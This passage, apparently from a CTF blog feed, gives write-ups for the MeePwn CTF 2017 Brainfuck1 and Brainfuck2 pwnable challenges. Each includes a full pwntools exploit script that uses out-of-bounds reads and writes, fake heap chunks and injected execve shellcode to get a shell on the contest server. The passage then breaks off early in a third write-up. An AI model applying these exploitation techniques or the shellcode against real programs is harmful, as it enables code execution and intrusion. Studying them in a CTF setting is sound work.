&lt;p&gt;First we use the OOB read to leak the machine code buffer address. After that, we use OOB write to overwrite &lt;code class=&quot;highlighter-rouge&quot;&gt;bf_data-&amp;gt;dp&lt;/code&gt;, making it point to our shellcode buffer, then use &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;gt;&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;,&lt;/code&gt; to write our shellcode to &lt;code class=&quot;highlighter-rouge&quot;&gt;bf_data-&amp;gt;dp&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Now because &lt;code class=&quot;highlighter-rouge&quot;&gt;bf_data-&amp;gt;dp&lt;/code&gt; is near to &lt;code class=&quot;highlighter-rouge&quot;&gt;bf_data-&amp;gt;sc_buf&lt;/code&gt;, so again we can use the OOB write to modify the content of &lt;code class=&quot;highlighter-rouge&quot;&gt;bf_data-&amp;gt;sc_buf&lt;/code&gt;, creating a &lt;strong&gt;self-modified machine code&lt;/strong&gt; situation. I decided to modify the end of the machine code into:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mov rax, shellcode_buf_addr
call rax
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;```python exp_bf1.py
#!/usr/bin/env python&lt;/p&gt;

&lt;p&gt;from pwn import *
import subprocess
import sys
import time&lt;/p&gt;

&lt;p&gt;HOST = “139.59.244.42”
PORT = 31337
ELF_PATH = “./bf1”&lt;/p&gt;

&lt;p&gt;context.binary = ELF_PATH
context.log_level = ‘INFO’ # [‘CRITICAL’, ‘DEBUG’, ‘ERROR’, ‘INFO’, ‘NOTSET’, ‘WARN’, ‘WARNING’]
context.terminal = [‘tmux’, ‘splitw’] # for gdb.attach&lt;/p&gt;

&lt;p&gt;elf = context.binary # context.binary is an ELF object&lt;/p&gt;

&lt;p&gt;def cmd(s):
    r.sendlineafter(“»”, s)&lt;/p&gt;

&lt;p&gt;def write(move, content):
    payload = “”
    if move &amp;lt; 0:
        payload = “&amp;lt;” * abs(move)
    else:
        payload = “&amp;gt;” * abs(move)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;payload += &quot;,&amp;gt;&quot;*len(content)

cmd(payload)
r.sendline(content)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;sc = “\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x31\xf6\x6a\x3b\x58\x99\x0f\x05”&lt;/p&gt;

&lt;p&gt;if &lt;strong&gt;name&lt;/strong&gt; == “&lt;strong&gt;main&lt;/strong&gt;”:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;r = remote(HOST, PORT)

# leak mmap address 
payload = &quot;&amp;lt;&quot;*0x28 # move to &amp;amp;bf_data-&amp;gt;sc_buf
payload += &quot;.&amp;gt;&quot;*8

cmd(payload)
sc_base = u64(r.recvuntil(&quot;&amp;gt;&amp;gt;&quot;)[:8:]) &amp;gt;&amp;gt; 8
r.unrecv(&quot;&amp;gt;&amp;gt;&quot;)
log.success(&quot;sc_base: &quot;+hex(sc_base))

# make size = 0x400 so it won't clear our shellcode
write(-0x10, p64(0x400))
# change bf_data-&amp;gt;dp = our shellcode buffer
write(-0x30, p64(sc_base+0x800))
# write final shellcode to our shellcode buffer
write(0, sc)
# write to bf_data-&amp;gt;sc_buf ( it will become a self-modified shellcode)
init_sc = asm(&quot;mov rax, %s&quot; % hex(sc_base+0x800))
init_sc += asm(&quot;call rax&quot;)
print &quot;init_sc&quot;, init_sc.encode('hex')
print &quot;len:&quot;, len(init_sc)
write(-0x70d, init_sc)
r.interactive() ```
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;flag: &lt;code class=&quot;highlighter-rouge&quot;&gt;MeePwnCTF{this_is_simple_challenge_:banana-dance:}&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;brainfuck2&quot;&gt;Brainfuck2&lt;/h2&gt;

&lt;p&gt;For Brainfuck2, the binary is basically the same as Brainfuck1, except it has the following exectuting process:&lt;/p&gt;

&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;BrainFuckVM&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BrainFuckVM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BrainFuckVM&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sc_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// ST20_8@1
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;BrainFuckVM&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// ST18_8@1
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;BrainFuckVM&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// rax@3
&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sc_buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sc_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/* allocate + memset bf_data-&amp;gt;dp */&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;operator&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[](&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100uLL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x100uLL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/* set the sc_buf's permission to r-x*/&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mprotect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sc_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sc_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
    &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sc_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bf_mem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/* set the sc_buf's permission back to rw-*/&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mprotect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sc_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sc_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sc_pos&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sc_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sc_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/* free bf_data-&amp;gt;dp */&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dp&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;operator&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;delete&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Several changes are made:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;We can hardly control the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;bf_data-&amp;gt;dp&lt;/code&gt;, it will only be allocated before the execution of the machine code.&lt;/li&gt;
  &lt;li&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;bf_data-&amp;gt;sc_buf&lt;/code&gt;’s permission is changed to &lt;code class=&quot;highlighter-rouge&quot;&gt;r-x&lt;/code&gt;, so this time the self-modified trick won’t work.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Luckily, the vulnerability is still there – we can still use the OOB read/write to do some evil stuff ;)&lt;/p&gt;

&lt;p&gt;First of all, we can still use the OOB write to modify the &lt;code class=&quot;highlighter-rouge&quot;&gt;bf_data-&amp;gt;dp&lt;/code&gt; pointer, and because later the program will free this pointer, this means that &lt;strong&gt;we can control the address that is being freed&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;After program free the &lt;code class=&quot;highlighter-rouge&quot;&gt;bf_data-&amp;gt;dp&lt;/code&gt; pointer, the first memory allocation will be the command line buffer, which chunk size is &lt;code class=&quot;highlighter-rouge&quot;&gt;0x110&lt;/code&gt;. If we freed a buffer with address &lt;code class=&quot;highlighter-rouge&quot;&gt;addr&lt;/code&gt; and size = 0x110, later when the program allocate a memory for the command line buffer, it will take &lt;code class=&quot;highlighter-rouge&quot;&gt;addr&lt;/code&gt; as the new buffer, &lt;strong&gt;and so we can control the content of &lt;code class=&quot;highlighter-rouge&quot;&gt;addr&lt;/code&gt;&lt;/strong&gt; by input our command ( the brainfuck code ).&lt;/p&gt;

&lt;p&gt;Based on the above concept, I decided to do the following:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Use OOB read to leak the heap address&lt;/li&gt;
  &lt;li&gt;Use OOB write to create fake chunk at &lt;code class=&quot;highlighter-rouge&quot;&gt;bf_data - some_offset&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Use OOB write to overwrite &lt;code class=&quot;highlighter-rouge&quot;&gt;bf_data-&amp;gt;dp&lt;/code&gt;, making it point to our fake chunk&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;By doing this, the program will eventually allocate &lt;code class=&quot;highlighter-rouge&quot;&gt;bf_data - some_offset&lt;/code&gt; to the command line buffer, &lt;strong&gt;and thus making us able to control &lt;code class=&quot;highlighter-rouge&quot;&gt;bf_data&lt;/code&gt; by input the next brainfuck code&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Since now we can control the structure of &lt;code class=&quot;highlighter-rouge&quot;&gt;bf_data&lt;/code&gt;, all we need to do is to overwrite the &lt;code class=&quot;highlighter-rouge&quot;&gt;bf_data-&amp;gt;sc_buf&lt;/code&gt;, making it point to our shellcode buffer, so we can execute our own shellcode and capture the flag. Before we overwrite &lt;code class=&quot;highlighter-rouge&quot;&gt;bf_data-&amp;gt;sc_buf&lt;/code&gt;, there’re several things we’ll need to be aware of:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;We’ll have to write our shellcode in our shellcode buffer first. Since we can’t control &lt;code class=&quot;highlighter-rouge&quot;&gt;bf_data-&amp;gt;dp&lt;/code&gt;, I decided to use the &lt;code class=&quot;highlighter-rouge&quot;&gt;[&amp;gt;.,]&lt;/code&gt; brainfuck code to write my shellcode. The brainfuck code will keep reading our input until it encounters a null byte ( thanks to wikipedia ). Our shellcode will be placed on &lt;code class=&quot;highlighter-rouge&quot;&gt;bf_data-&amp;gt;dp + some_offset&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Notice the program will modify the first several bytes of our shellcode, so it’s better to pad some &lt;code class=&quot;highlighter-rouge&quot;&gt;NOP&lt;/code&gt; at the beginning of our shellcode.&lt;/li&gt;
  &lt;li&gt;To avoid the program changing our shellcode into the &lt;code class=&quot;highlighter-rouge&quot;&gt;ret&lt;/code&gt; instruction, we’ll have to overwrite the &lt;code class=&quot;highlighter-rouge&quot;&gt;bf_data-&amp;gt;sc_pos&lt;/code&gt; data as well ( because the program will place the &lt;code class=&quot;highlighter-rouge&quot;&gt;ret&lt;/code&gt; machine code at &lt;code class=&quot;highlighter-rouge&quot;&gt;bf_data-&amp;gt;sc_buf + bf_data-&amp;gt;sc_pos&lt;/code&gt; ). Overwrite this data to a large number, so the &lt;code class=&quot;highlighter-rouge&quot;&gt;ret&lt;/code&gt; instruction won’t effect our shellcode.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Final exploit script:
```python exp_bf2.py
#!/usr/bin/env python&lt;/p&gt;

&lt;p&gt;from pwn import *
import subprocess
import sys
import time&lt;/p&gt;

&lt;p&gt;HOST = “139.59.244.42”
PORT = 31338
ELF_PATH = “./bf2”&lt;/p&gt;

&lt;p&gt;context.binary = ELF_PATH
context.log_level = ‘INFO’ # [‘CRITICAL’, ‘DEBUG’, ‘ERROR’, ‘INFO’, ‘NOTSET’, ‘WARN’, ‘WARNING’]
context.terminal = [‘tmux’, ‘splitw’] # for gdb.attach&lt;/p&gt;

&lt;p&gt;elf = context.binary # context.binary is an ELF object&lt;/p&gt;

&lt;p&gt;def cmd(s):
    r.sendlineafter(“»”, s)&lt;/p&gt;

&lt;p&gt;def write(move, content, scmd=None, scontent=None):
    payload = “”
    if move &amp;lt; 0:
        payload = “&amp;lt;” * abs(move)
    else:
        payload = “&amp;gt;” * abs(move)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;payload += &quot;,&amp;gt;&quot;*len(content)
if scmd:
    payload += scmd
    content += scontent
payload = payload.ljust(512, &quot;B&quot;)

cmd(payload)
r.sendline(content)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;def leak(move, cnt):
    if move &amp;lt; 0:
        payload = “&amp;lt;” * abs(move)
    else:
        payload = “&amp;gt;” * abs(move)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;payload += &quot;.&amp;gt;&quot;*cnt
payload = payload.ljust(512, &quot;B&quot;)

cmd(payload)
r.recv(1024) # ¯\_(ツ)_/¯ 
ret = r.recvuntil(&quot;&amp;gt;&amp;gt;&quot;)[:-2:]
r.unrecv(&quot;&amp;gt;&amp;gt;&quot;)
return ret
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;sc = “\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x31\xf6\x6a\x3b\x58\x99\x0f\x05”&lt;/p&gt;

&lt;p&gt;if &lt;strong&gt;name&lt;/strong&gt; == “&lt;strong&gt;main&lt;/strong&gt;”:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;r = None
if len(sys.argv) == 2:
    r = process(ELF_PATH)
else:
    r = remote(HOST, PORT)

# make unsortbin + libc address
cmd(&quot;A&quot;*512)

# leak
libc.address = u64(leak(0x110, 8)) - 0x3c3b78 # local
log.success(&quot;libc base: &quot;+hex(libc.address))
heap_addr = u64(leak(-0x30, 8))
log.success(&quot;heap_addr: &quot;+hex(heap_addr))
fake_chunk = heap_addr - 0x70
log.success(&quot;fake_chunk: &quot;+hex(fake_chunk))
sc_buf = heap_addr + 0x3b0# our shellcode buffer
log.success(&quot;sc_buf: &quot;+hex(sc_buf))

# fake chunk
write(-0x78, p64(0x111) )
special = &quot;&amp;lt;&quot;*0xd0 + &quot;,&amp;gt;&quot;*8
# fake next size
write(0x98, p64(0x71),special, p64(fake_chunk))
# create gets-like function, puts shellcode @ 0xXXXXX000 ( our shellcode buffer)
cmd(&quot;,[&amp;gt;.,]&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;,[&amp;gt;.,]&quot;)
payload = &quot;i&quot;*0x108 + &quot;\xa1\x01\x02\x00&quot; # fake next size
payload += &quot;i&quot;*0x190
payload += &quot;\x90&quot;*0x10 + sc + &quot;\x00&quot;
r.send(payload)
# overwrite bf_data, make bf_data-&amp;gt;sc_buf point to our shellcode buffer
payload = &quot;i&quot;*0x40
payload += p64(0) + p64(sc_buf) + p64(0x100) + p64(100) + p64(0x1000) + p64(0x111)
cmd(payload)
r.interactive()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;```&lt;/p&gt;

&lt;p&gt;flag: &lt;code class=&quot;highlighter-rouge&quot;&gt;MeePwnCTF{My_M33pwn_h34p_1s_fun?}&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Got both first blood on these challenges ! WOOHOO ! 😎🤘&lt;/p&gt;</content><author><name>Bruce Chen</name></author><category term="CTF" /><category term="Python" /><category term="Pwnable" /><category term="heap" /><category term="MeePwn" /><category term="brainfuck" /><category term="shellcode" /><summary type="html">Category: Pwnable</summary></entry><entry><title type="html">MeePwn CTF 2017 – anotherarena</title><link href="http://0.0.0.0:4000/MeePwn-CTF-2017-anotherarena/" rel="alternate" type="text/html" title="MeePwn CTF 2017 -- anotherarena" /><published>2017-07-16T19:00:00+08:00</published><updated>2017-07-16T19:00:00+08:00</updated><id>http://0.0.0.0:4000/MeePwn-CTF-2017-anotherarena</id><content type="html" xml:base="http://0.0.0.0:4000/MeePwn-CTF-2017-anotherarena/">&lt;p&gt;&lt;strong&gt;Category:&lt;/strong&gt; Pwnable&lt;/p&gt;

&lt;p&gt;64 bit ELF, Partial RELRO, canary &amp;amp; NX enabled, No PIE.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;The program is a simple crackme program with multi-thread. First, the program will read the FLAG into a global buffer &lt;code class=&quot;highlighter-rouge&quot;&gt;flag&lt;/code&gt; . Then, it will ask us to input the size of a buffer. Later the program will use a thread to malloc a buffer &lt;code class=&quot;highlighter-rouge&quot;&gt;buf&lt;/code&gt; with the given size. Then the program will use another thread to do the following:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Ask for a 4 byte data and treat it as &lt;code class=&quot;highlighter-rouge&quot;&gt;index&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Ask for a 4 byte data, and store it at &lt;code class=&quot;highlighter-rouge&quot;&gt;buf[index]&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Repeat&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;It will repeat &lt;code class=&quot;highlighter-rouge&quot;&gt;given_size / 4&lt;/code&gt; times. If the input &lt;code class=&quot;highlighter-rouge&quot;&gt;index&lt;/code&gt; is larger than the given size, it will also break out the loop. Basically it just letting us input a bunch of integers to the &lt;code class=&quot;highlighter-rouge&quot;&gt;buf&lt;/code&gt; buffer.&lt;/p&gt;

&lt;p&gt;After that the program will do the following:&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cm&quot;&gt;/* add all integers in buf to v5*/&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LODWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g_heap_buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;signed&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;cm&quot;&gt;/* read size and allocate a buffer ( for license) */&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read_int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;lic&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;/* read to lic */&lt;/span&gt;
